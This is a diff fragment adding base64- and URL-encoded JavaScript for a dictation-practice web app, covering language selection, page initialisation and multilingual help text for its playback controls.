+    +"MjBoZWlnaHQlMjBpbiUyMGNhc2UlMjB0ZXh0JTIwcmVmbG93JTIwY2hhbmdlZCUyMGl0JTBBJTIwJTIw"
+    +"Y29uc3QlMjBib2R5JTIwJTNEJTIwJTI0JTI4JTI3c2V0dGluZ3MtYm9keSUyNyUyOSUzQiUwQSUyMCUy"
+    +"MGlmJTIwJTI4Ym9keSUyMCUyNiUyNiUyMGJvZHkuc3R5bGUubWF4SGVpZ2h0JTIwJTIxJTNEJTNEJTIw"
+    +"JTI3MHB4JTI3JTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwYm9keS5zdHlsZS5tYXhIZWlnaHQlMjAlM0Ql"
+    +"MjAlMjdub25lJTI3JTNCJTBBJTIwJTIwJTIwJTIwYm9keS5zdHlsZS5tYXhIZWlnaHQlMjAlM0QlMjBi"
+    +"b2R5LnNjcm9sbEhlaWdodCUyMCUyQiUyMCUyN3B4JTI3JTNCJTBBJTIwJTIwJTdEJTBBJTdEJTBBJTBB"
+    +"ZnVuY3Rpb24lMjBpbml0TGFuZyUyOCUyOSUyMCU3QiUwQSUyMCUyMCUyRiUyRiUyMEF1dG8tZGV0ZWN0"
+    +"JTIwZnJvbSUyMGJyb3dzZXIlMjBpZiUyMG5vJTIwc2F2ZWQlMjBwcmVmZXJlbmNlJTBBJTIwJTIwY29u"
+    +"c3QlMjBzYXZlZCUyMCUzRCUyMGxvY2FsU3RvcmFnZS5nZXRJdGVtJTI4JTI3bGFuZyUyNyUyOSUzQiUw"
+    +"QSUyMCUyMGlmJTIwJTI4c2F2ZWQlMjAlMjYlMjYlMjBUUkFOU0xBVElPTlMlNUJzYXZlZCU1RCUyOSUy"
+    +"MCU3QiUwQSUyMCUyMCUyMCUyMGN1cnJlbnRMYW5nJTIwJTNEJTIwc2F2ZWQlM0IlMEElMjAlMjAlN0Ql"
+    +"MjBlbHNlJTIwJTdCJTBBJTIwJTIwJTIwJTIwY29uc3QlMjBicm93c2VyTGFuZyUyMCUzRCUyMG5hdmln"
+    +"YXRvci5sYW5ndWFnZS5zcGxpdCUyOCUyNy0lMjclMjklNUIwJTVEJTNCJTBBJTIwJTIwJTIwJTIwY3Vy"
+    +"cmVudExhbmclMjAlM0QlMjBUUkFOU0xBVElPTlMlNUJicm93c2VyTGFuZyU1RCUyMCUzRiUyMGJyb3dz"
+    +"ZXJMYW5nJTIwJTNBJTIwJTI3ZW4lMjclM0IlMEElMjAlMjAlN0QlMEElMEElMjAlMjBjb25zdCUyMHNl"
+    +"bCUyMCUzRCUyMCUyNCUyOCUyN2xhbmctc2VsZWN0JTI3JTI5JTNCJTBBJTIwJTIwc2VsLnZhbHVlJTIw"
+    +"JTNEJTIwY3VycmVudExhbmclM0IlMEElMjAlMjBzZWwuYWRkRXZlbnRMaXN0ZW5lciUyOCUyN2NoYW5n"
+    +"ZSUyNyUyQyUyMCUyOCUyOSUyMCUzRCUzRSUyMCU3QiUwQSUyMCUyMCUyMCUyMGN1cnJlbnRMYW5nJTIw"
+    +"JTNEJTIwc2VsLnZhbHVlJTNCJTBBJTIwJTIwJTIwJTIwbG9jYWxTdG9yYWdlLnNldEl0ZW0lMjglMjds"
+    +"YW5nJTI3JTJDJTIwY3VycmVudExhbmclMjklM0IlMEElMjAlMjAlMjAlMjBhcHBseUxhbmclMjglMjkl"
+    +"M0IlMEElMjAlMjAlMjAlMjBhdXRvU2VsZWN0Vm9pY2VGb3JMYW5nJTI4Y3VycmVudExhbmclMjklM0Il"
+    +"MEElMjAlMjAlN0QlMjklM0IlMEElMEElMjAlMjBhcHBseUxhbmclMjglMjklM0IlMEElN0QlMEElMEEl"
+    +"MkYlMkYlMjAtLS0tLSUyMEluaXQlMjAtLS0tLSUwQWRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIlMjgl"
+    +"MjdET01Db250ZW50TG9hZGVkJTI3JTJDJTIwJTI4JTI5JTIwJTNEJTNFJTIwJTdCJTBBJTIwJTIwaW5p"
+    +"dExhbmclMjglMjklM0IlMEElMjAlMjBpbml0VGFicyUyOCUyOSUzQiUwQSUyMCUyMGluaXRJbnB1dFRh"
+    +"YnMlMjglMjklM0IlMEElMjAlMjBpbml0RmlsZVVwbG9hZCUyOCUyOSUzQiUwQSUyMCUyMGluaXRTZXR0"
+    +"aW5ncyUyOCUyOSUzQiUwQSUyMCUyMGluaXRQbGF5YmFjayUyOCUyOSUzQiUwQSUyMCUyMGxvYWRCcm93"
+    +"c2VyVm9pY2VzJTI4JTI5JTNCJTBBJTIwJTIwaW5pdFNldHRpbmdzQ29sbGFwc2UlMjglMjklM0IlMEEl"
+    +"MjAlMjBpbml0SGVscE1lbnUlMjglMjklM0IlMEElN0QlMjklM0IlMEElMEElMkYlMkYlMjAtLS0tLSUy"
+    +"MEhlbHAlMjBtZW51JTIwJTI2JTIwbW9kYWxzJTIwLS0tLS0lMEFjb25zdCUyMEhFTFBfQ09OVEVOVCUy"
+    +"MCUzRCUyMCU3QiUwQSUyMCUyMGVuJTNBJTIwJTYwJTBBJTIwJTIwJTIwJTIwJTNDaDMlM0VXaGF0JTIw"
+    +"aXMlMjB0aGlzJTNGJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0NwJTNFRGljdGF0aW9uJTIwaXMl"
+    +"MjBhJTIwcHJhY3RpY2UlMjB0b29sJTIwdGhhdCUyMHJlYWRzJTIweW91ciUyMHRleHQlMjBhbG91ZCUy"
+    +"MHdvcmQtYnktd29yZCUyMG9yJTIwc2VudGVuY2UtYnktc2VudGVuY2UlMkMlMjBzbyUyMHlvdSUyMGNh"
+    +"biUyMHdyaXRlJTIwZG93biUyMHdoYXQlMjB5b3UlMjBoZWFyJTIwJUUyJTgwJTk0JTIwanVzdCUyMGxp"
+    +"a2UlMjBhJTIwY2xhc3Nyb29tJTIwZGljdGF0aW9uJTIwZXhlcmNpc2UuJTNDJTJGcCUzRSUwQSUyMCUy"
+    +"MCUyMCUyMCUzQ2gzJTNFR2V0dGluZyUyMHN0YXJ0ZWQlM0MlMkZoMyUzRSUwQSUyMCUyMCUyMCUyMCUz"
+    +"Q3VsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0VQYXN0ZSUyMG9yJTIwdHlwZSUyMHRleHQl"
+    +"MjBpbiUyMHRoZSUyMCUzQ3N0cm9uZyUzRUNvbnRlbnQlM0MlMkZzdHJvbmclM0UlMjBib3glMkMlMjBv"
+    +"ciUyMHVwbG9hZCUyMGElMjAlM0NzdHJvbmclM0UudHh0JTIwZmlsZSUzQyUyRnN0cm9uZyUzRS4lM0Ml"
+    +"MkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFUHJlc3MlMjAlM0NzdHJvbmclM0UlRTIl"
+    +"OTYlQjYlMjBQbGF5JTNDJTJGc3Ryb25nJTNFJTIwdG8lMjBzdGFydC4lMjBUaGUlMjBhcHAlMjB3aWxs"
+    +"JTIwc3BlYWslMjBlYWNoJTIwaXRlbSUyMGFuZCUyMHBhdXNlJTIwYmVmb3JlJTIwbW92aW5nJTIwdG8l"
+    +"MjB0aGUlMjBuZXh0LiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0VVc2UlMjAl"
+    +"M0NzdHJvbmclM0VTaG93JTIwJTJGJTIwSGlkZSUzQyUyRnN0cm9uZyUzRSUyMHRvJTIwcmV2ZWFsJTIw"
+    +"b3IlMjBjb25jZWFsJTIwdGhlJTIwY3VycmVudCUyMHdvcmQlMjBvciUyMHNlbnRlbmNlJTIwb24lMjBz"
+    +"Y3JlZW4uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlM0MlMkZ1bCUzRSUwQSUyMCUyMCUyMCUyMCUz"
+    +"Q2gzJTNFU2V0dGluZ3MlM0MlMkZoMyUzRSUwQSUyMCUyMCUyMCUyMCUzQ3VsJTNFJTBBJTIwJTIwJTIw"
+    +"JTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0VNb2RlJTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0"
+    +"JTIwV29yZCUyMGJ5JTIwV29yZCUyMG9yJTIwU2VudGVuY2UlMjBieSUyMFNlbnRlbmNlLiUyMEluJTIw"
+    +"c2VudGVuY2UlMjBtb2RlJTJDJTIwdGhlJTIwYXBwJTIwYWxzbyUyMHBhdXNlcyUyMGF0JTIwY29tbWFz"
+    +"LiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0VQYXVzZSUz"
+    +"QyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMGdhcCUyMGJldHdlZW4lMjBpdGVtcyUyMCUyODAuNSUy"
+    +"MHMlMjAlRTIlODAlOTMlMjAxMCUyMHMlMjkuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAl"
+    +"M0NsaSUzRSUzQ3N0cm9uZyUzRVJlcGVhdCUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMGhvdyUy"
+    +"MG1hbnklMjB0aW1lcyUyMGVhY2glMjBpdGVtJTIwaXMlMjBzcG9rZW4lMjBiZWZvcmUlMjBtb3Zpbmcl"
+    +"MjBvbi4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFVm9p"
+    +"Y2UlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjBjaG9vc2UlMjBhbnklMjB2b2ljZSUyMGluc3Rh"
+    +"bGxlZCUyMG9uJTIweW91ciUyMGRldmljZS4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUz"
+    +"Q2xpJTNFJTNDc3Ryb25nJTNFU3BlZWNoJTIwUmF0ZSUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUy"
+    +"MHNsb3clMjBkb3duJTIwb3IlMjBzcGVlZCUyMHVwJTIwdGhlJTIwdm9pY2UuJTNDJTJGbGklM0UlMEEl"
+    +"MjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRVRUUyUyMHN0YXJ0dXAlMjBkZWxheSUz"
+    +"QyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMGluY3JlYXNlJTIwaWYlMjB0aGUlMjBmaXJzdCUyMHdv"
+    +"cmQlMjBvZiUyMGVhY2glMjBpdGVtJTIwaXMlMjBjdXQlMjBvZmYlMjAlMjhicm93c2VyLWRlcGVuZGVu"
+    +"dCUyOS4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUzQyUyRnVsJTNFJTBBJTIwJTIwJTIwJTIwJTND"
+    +"aDMlM0VQbGF5YmFjayUyMGNvbnRyb2xzJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0N1bCUzRSUw"
+    +"QSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUUyJThGJUFFJTIwJTJGJTIwJUUy"
+    +"JThGJUFEJTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwanVtcCUyMHRvJTIwdGhlJTIwcHJldmlv"
+    +"dXMlMjBvciUyMG5leHQlMjBpdGVtJTJDJTIwcHJlc2VydmluZyUyMHRoZSUyMGN1cnJlbnQlMjBwbGF5"
+    +"JTJGcGF1c2UlMjBzdGF0ZS4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTND"
+    +"c3Ryb25nJTNFJUUyJThGJUI4JTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwcGF1c2UlMjBhbmQl"
+    +"MjByZXN1bWUuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUz"
+    +"RSVGMCU5RiU5NCU4MSUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMHRvZ2dsZSUyMGxvb3Bpbmcl"
+    +"MjBvZiUyMHRoZSUyMGN1cnJlbnQlMjBpdGVtLiUyMFdoaWxlJTIwYWN0aXZlJTJDJTIwdGhlJTIwaXRl"
+    +"bSUyMHJlcGVhdHMlMjBpbmRlZmluaXRlbHklMjBhdCUyMHRoZSUyMGN1cnJlbnQlMjBzcGVlZCUyMGFu"
+    +"ZCUyMHBhdXNlJTIwaW50ZXJ2YWwuJTIwQ2xpY2slMjAlM0NzdHJvbmclM0UlRjAlOUYlOTQlODElM0Ml"
+    +"MkZzdHJvbmclM0UlMjBhZ2FpbiUyMHRvJTIwc3RvcCUyMGxvb3BpbmclMjBhbmQlMjByZXN1bWUlMjBu"
+    +"b3JtYWwlMjBwcm9ncmVzc2lvbi4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNF"
+    +"JTNDc3Ryb25nJTNFJUUyJThGJUI5JTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwc3RvcCUyMGFu"
+    +"ZCUyMHJlc2V0LiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlNjAlMkMlMEElMjAl"
+    +"MjBmciUzQSUyMCU2MCUwQSUyMCUyMCUyMCUyMCUzQ2gzJTNFJUMzJTgwJTIwcXVvaSUyMCVDMyVBN2El"
+    +"MjBzZXJ0JTIwJTNGJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0NwJTNFRGljdCVDMyVBOWUlMjBl"
+    +"c3QlMjB1biUyMG91dGlsJTIwZCUyN2VudHJhJUMzJUFFbmVtZW50JTIwcXVpJTIwbGl0JTIwdm90cmUl"
+    +"MjB0ZXh0ZSUyMCVDMyVBMCUyMHZvaXglMjBoYXV0ZSUyMG1vdCUyMHBhciUyMG1vdCUyMG91JTIwcGhy"
+    +"YXNlJTIwcGFyJTIwcGhyYXNlJTJDJTIwcG91ciUyMHF1ZSUyMHZvdXMlMjBwdWlzc2lleiUyMCVDMyVB"
+    +"OWNyaXJlJTIwY2UlMjBxdWUlMjB2b3VzJTIwZW50ZW5kZXouJTNDJTJGcCUzRSUwQSUyMCUyMCUyMCUy"
+    +"MCUzQ2gzJTNFRCVDMyVBOW1hcnJhZ2UlM0MlMkZoMyUzRSUwQSUyMCUyMCUyMCUyMCUzQ3VsJTNFJTBB"
+    +"JTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0VDb2xsZXolMjBvdSUyMHRhcGV6JTIwZHUlMjB0ZXh0ZSUy"
+    +"MGRhbnMlMjBsYSUyMHpvbmUlMjAlM0NzdHJvbmclM0VDb250ZW51JTNDJTJGc3Ryb25nJTNFJTJDJTIw"
+    +"b3UlMjBpbXBvcnRleiUyMHVuJTIwJTNDc3Ryb25nJTNFZmljaGllciUyMC50eHQlM0MlMkZzdHJvbmcl"
+    +"M0UuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRUFwcHV5ZXolMjBzdXIlMjAl"
+    +"M0NzdHJvbmclM0UlRTIlOTYlQjYlMjBMZWN0dXJlJTNDJTJGc3Ryb25nJTNFJTIwcG91ciUyMGNvbW1l"
+    +"bmNlci4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFVXRpbGlzZXolMjAlM0Nz"
+    +"dHJvbmclM0VBZmZpY2hlciUyMCUyRiUyME1hc3F1ZXIlM0MlMkZzdHJvbmclM0UlMjBwb3VyJTIwciVD"
+    +"MyVBOXYlQzMlQTlsZXIlMjBvdSUyMGNhY2hlciUyMGxlJTIwbW90JTIwb3UlMjBsYSUyMHBocmFzZSUy"
+    +"MGVuJTIwY291cnMuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlM0MlMkZ1bCUzRSUwQSUyMCUyMCUy"
+    +"MCUyMCUzQ2gzJTNFUGFyYW0lQzMlQTh0cmVzJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0N1bCUz"
+    +"RSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFTW9kZSUzQyUyRnN0cm9uZyUz"
+    +"RSUyMCVFMiU4MCU5NCUyME1vdCUyMHBhciUyMG1vdCUyMG91JTIwUGhyYXNlJTIwcGFyJTIwcGhyYXNl"
+    +"LiUyMEVuJTIwbW9kZSUyMHBocmFzZSUyQyUyMGwlMjdhcHBsaWNhdGlvbiUyMG1hcnF1ZSUyMGF1c3Np"
+    +"JTIwdW5lJTIwcGF1c2UlMjBhdXglMjB2aXJndWxlcy4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUy"
+    +"MCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFUGF1c2UlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjBk"
+    +"JUMzJUE5bGFpJTIwZW50cmUlMjBsZXMlMjAlQzMlQTlsJUMzJUE5bWVudHMuJTNDJTJGbGklM0UlMEEl"
+    +"MjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRVIlQzMlQTlwJUMzJUE5dGl0aW9uJTND"
+    +"JTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwbm9tYnJlJTIwZGUlMjByJUMzJUE5cCVDMyVBOXRpdGlv"
+    +"bnMlMjBhdmFudCUyMGRlJTIwcGFzc2VyJTIwJUMzJUEwJTIwbGElMjBzdWl0ZS4lM0MlMkZsaSUzRSUw"
+    +"QSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFVm9peCUzQyUyRnN0cm9uZyUzRSUy"
+    +"MCVFMiU4MCU5NCUyMGNob2lzaXNzZXolMjB1bmUlMjB2b2l4JTIwaW5zdGFsbCVDMyVBOWUlMjBzdXIl"
+    +"MjBsJTI3YXBwYXJlaWwuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0"
+    +"cm9uZyUzRVZpdGVzc2UlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjByYWxlbnRpciUyMG91JTIw"
+    +"YWNjJUMzJUE5bCVDMyVBOXJlciUyMGxhJTIwdm9peC4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUy"
+    +"MCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFRCVDMyVBOWxhaSUyMGRlJTIwZCVDMyVBOW1hcnJhZ2UlMjBU"
+    +"VFMlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjBhdWdtZW50ZXolMjBzaSUyMGxlJTIwcHJlbWll"
+    +"ciUyMG1vdCUyMGVzdCUyMGNvdXAlQzMlQTklMjAlMjhzZWxvbiUyMGxlJTIwbmF2aWdhdGV1ciUyOS4l"
+    +"M0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUzQyUyRnVsJTNFJTBBJTIwJTIwJTIwJTIwJTNDaDMlM0VD"
+    +"b250ciVDMyVCNGxlcyUyMGRlJTIwbGVjdHVyZSUzQyUyRmgzJTNFJTBBJTIwJTIwJTIwJTIwJTNDdWwl"
+    +"M0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRSVFMiU4RiVBRSUyMCUyRiUy"
+    +"MCVFMiU4RiVBRCUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMCVDMyVBOWwlQzMlQTltZW50JTIw"
+    +"cHIlQzMlQTljJUMzJUE5ZGVudCUyMCUyRiUyMHN1aXZhbnQlMkMlMjBlbiUyMGNvbnNlcnZhbnQlMjBs"
+    +"JTI3JUMzJUE5dGF0JTIwbGVjdHVyZSUyRnBhdXNlLiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIw"
+    +"JTIwJTNDbGklM0UlM0NzdHJvbmclM0UlRTIlOEYlQjglM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQl"
+    +"MjBwYXVzZSUyMGV0JTIwcmVwcmlzZS4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xp"
+    +"JTNFJTNDc3Ryb25nJTNFJUYwJTlGJTk0JTgxJTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwYWN0"
+    +"aXZlJTIwb3UlMjBkJUMzJUE5c2FjdGl2ZSUyMGxhJTIwciVDMyVBOXAlQzMlQTl0aXRpb24lMjBlbiUy"
+    +"MGJvdWNsZSUyMGRlJTIwbCUyNyVDMyVBOWwlQzMlQTltZW50JTIwZW4lMjBjb3Vycy4lMjBQZW5kYW50"
+    +"JTIwbGElMjBib3VjbGUlMkMlMjBsJTI3JUMzJUE5bCVDMyVBOW1lbnQlMjBzZSUyMHIlQzMlQTlwJUMz"
+    +"JUE4dGUlMjBpbmQlQzMlQTlmaW5pbWVudC4lMjBDbGlxdWV6JTIwJUMzJUEwJTIwbm91dmVhdSUyMHN1"
+    +"ciUyMCUzQ3N0cm9uZyUzRSVGMCU5RiU5NCU4MSUzQyUyRnN0cm9uZyUzRSUyMHBvdXIlMjByZXByZW5k"
+    +"cmUlMjBsYSUyMHByb2dyZXNzaW9uJTIwbm9ybWFsZS4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUy"
+    +"MCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUUyJThGJUI5JTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0"
+    +"JTIwYXJyJUMzJUFBdCUyMGV0JTIwciVDMyVBOWluaXRpYWxpc2F0aW9uLiUzQyUyRmxpJTNFJTBBJTIw"
+    +"JTIwJTIwJTIwJTNDJTJGdWwlM0UlNjAlMkMlMEElMjAlMjB6aCUzQSUyMCU2MCUwQSUyMCUyMCUyMCUy"
+    +"MCUzQ2gzJTNFJUU4JUJGJTk5JUU2JTk4JUFGJUU0JUJCJTgwJUU0JUI5JTg4JUVGJUJDJTlGJTNDJTJG"
+    +"aDMlM0UlMEElMjAlMjAlMjAlMjAlM0NwJTNFJUU1JTkwJUFDJUU1JTg2JTk5JUU2JTk4JUFGJUU0JUI4"
+    +"JTgwJUU2JUFDJUJFJUU3JUJCJTgzJUU0JUI5JUEwJUU1JUI3JUE1JUU1JTg1JUI3JUVGJUJDJThDJUU5"
+    +"JTgwJTkwJUU4JUFGJThEJUU2JTg4JTk2JUU5JTgwJTkwJUU1JThGJUE1JUU2JTlDJTk3JUU4JUFGJUJC"
+    +"JUU2JTgyJUE4JUU3JTlBJTg0JUU2JTk2JTg3JUU2JTlDJUFDJUVGJUJDJThDJUU4JUFFJUE5JUU2JTgy"
+    +"JUE4JUU1JTgzJThGJUU4JUFGJUJFJUU1JUEwJTgyJUU1JTkwJUFDJUU1JTg2JTk5JUU0JUI4JTgwJUU2"
+    +"JUEwJUI3JUU4JUJFJUI5JUU1JTkwJUFDJUU4JUJFJUI5JUU1JTg2JTk5JUUzJTgwJTgyJTNDJTJGcCUz"
+    +"RSUwQSUyMCUyMCUyMCUyMCUzQ2gzJTNFJUU1JUJGJUFCJUU5JTgwJTlGJUU1JUJDJTgwJUU1JUE3JThC"
+    +"JTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0N1bCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xp"
+    +"JTNFJUU1JTlDJUE4JTNDc3Ryb25nJTNFJUU1JTg2JTg1JUU1JUFFJUI5JTNDJTJGc3Ryb25nJTNFJUU2"
+    +"JUExJTg2JUU0JUI4JUFEJUU3JUIyJTk4JUU4JUI0JUI0JUU2JTg4JTk2JUU4JUJFJTkzJUU1JTg1JUE1"
+    +"JUU2JTk2JTg3JUU2JTlDJUFDJUVGJUJDJThDJUU2JTg4JTk2JUU0JUI4JThBJUU0JUJDJUEwJTIwJTND"
+    +"c3Ryb25nJTNFLnR4dCUyMCVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRnN0cm9uZyUzRSVFMyU4MCU4MiUz"
+    +"QyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlRTYlOEMlODklMjAlM0NzdHJvbmcl"
+    +"M0UlRTIlOTYlQjYlMjAlRTYlOTIlQUQlRTYlOTQlQkUlM0MlMkZzdHJvbmclM0UlMjAlRTUlQkMlODAl"
+    +"RTUlQTclOEIlRUYlQkMlOEMlRTUlQkElOTQlRTclOTQlQTglRTUlQjAlODYlRTYlOUMlOTclRTglQUYl"
+    +"QkIlRTYlQUYlOEYlRTQlQjglQUElRTklQTElQjklRTclOUIlQUUlRTUlQjklQjYlRTUlOUMlQTglRTcl"
+    +"QkIlQTclRTclQkIlQUQlRTQlQjklOEIlRTUlODklOEQlRTYlOUElODIlRTUlODElOUMlRTMlODAlODIl"
+    +"M0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJUU0JUJEJUJGJUU3JTk0JUE4JTND"
+    +"c3Ryb25nJTNFJUU2JTk4JUJFJUU3JUE0JUJBJTIwJTJGJTIwJUU5JTlBJTkwJUU4JTk3JThGJTNDJTJG"
+    +"c3Ryb25nJTNFJUU2JThDJTg5JUU5JTkyJUFFJUU2JTlEJUE1JUU2JTk4JUJFJUU3JUE0JUJBJUU2JTg4"
+    +"JTk2JUU5JTlBJTkwJUU4JTk3JThGJUU1JUJEJTkzJUU1JTg5JThEJUU4JUFGJThEJUU1JThGJUE1JUUz"
+    +"JTgwJTgyJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlM0MlMkZ1bCUzRSUwQSUyMCUyMCUyMCUyMCUz"
+    +"Q2gzJTNFJUU4JUFFJUJFJUU3JUJEJUFFJUU4JUFGJUI0JUU2JTk4JThFJTNDJTJGaDMlM0UlMEElMjAl"
+    +"MjAlMjAlMjAlM0N1bCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUU2"
+    +"JUE4JUExJUU1JUJDJThGJTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwJUU5JTgwJTkwJUU4JUFG"
+    +"JThEJUU2JTg4JTk2JUU5JTgwJTkwJUU1JThGJUE1JUUzJTgwJTgyJUU5JTgwJTkwJUU1JThGJUE1JUU2"
+    +"JUE4JUExJUU1JUJDJThGJUU0JUI4JThCJUVGJUJDJThDJUU5JTgwJTk3JUU1JThGJUI3JUU1JUE0JTg0"
+    +"JUU0JUI5JTlGJUU0JUJDJTlBJUU2JTlBJTgyJUU1JTgxJTlDJUUzJTgwJTgyJTNDJTJGbGklM0UlMEEl"
+    +"MjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRSVFNiU5QSU4MiVFNSU4MSU5QyUzQyUy"
+    +"RnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMCVFNiVBRiU4RiVFOSVBMSVCOSVFNCVCOSU4QiVFOSU5NyVC"
+    +"NCVFNyU5QSU4NCVFOSU5NyVCNCVFOSU5QSU5NCVFNiU5NyVCNiVFOSU5NyVCNCVFMyU4MCU4MiUzQyUy"
+    +"RmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0UlRTklODclOEQlRTUl"
+    +"QTQlOEQlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjAlRTYlQUYlOEYlRTklQTElQjklRTYlOUMl"
+    +"OTclRTglQUYlQkIlRTYlQUMlQTElRTYlOTUlQjAlRTMlODAlODIlM0MlMkZsaSUzRSUwQSUyMCUyMCUy"
+    +"MCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUU1JUEzJUIwJUU5JTlGJUIzJTNDJTJGc3Ryb25n"
+    +"JTNFJTIwJUUyJTgwJTk0JTIwJUU5JTgwJTg5JUU2JThCJUE5JUU4JUFFJUJFJUU1JUE0JTg3JUU0JUI4"
+    +"JThBJUU1JUFFJTg5JUU4JUEzJTg1JUU3JTlBJTg0JUU4JUFGJUFEJUU5JTlGJUIzJUUzJTgwJTgyJTND"
+    +"JTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRSVFOCVBRiVBRCVF"
+    +"OSU4MCU5RiUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMCVFNSU4QSVBMCVFNSVCRiVBQiVFNiU4"
+    +"OCU5NiVFNSU4NyU4RiVFNiU4NSVBMiVFNiU5QyU5NyVFOCVBRiVCQiVFOSU4MCU5RiVFNSVCQSVBNiVF"
+    +"MyU4MCU4MiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0VU"
+    +"VFMlMjAlRTUlOTAlQUYlRTUlOEElQTglRTUlQkIlQjYlRTglQkYlOUYlM0MlMkZzdHJvbmclM0UlMjAl"
+    +"RTIlODAlOTQlMjAlRTglOEIlQTUlRTYlQUYlOEYlRTklQTElQjklRTclQUMlQUMlRTQlQjglODAlRTQl"
+    +"QjglQUElRTglQUYlOEQlRTglQTIlQUIlRTYlODglQUElRTYlOTYlQUQlRUYlQkMlOEMlRTglQUYlQjcl"
+    +"RTklODAlODIlRTUlQkQlOTMlRTUlQTIlOUUlRTUlQTQlQTclRTYlQUQlQTQlRTUlODAlQkMlRUYlQkMl"
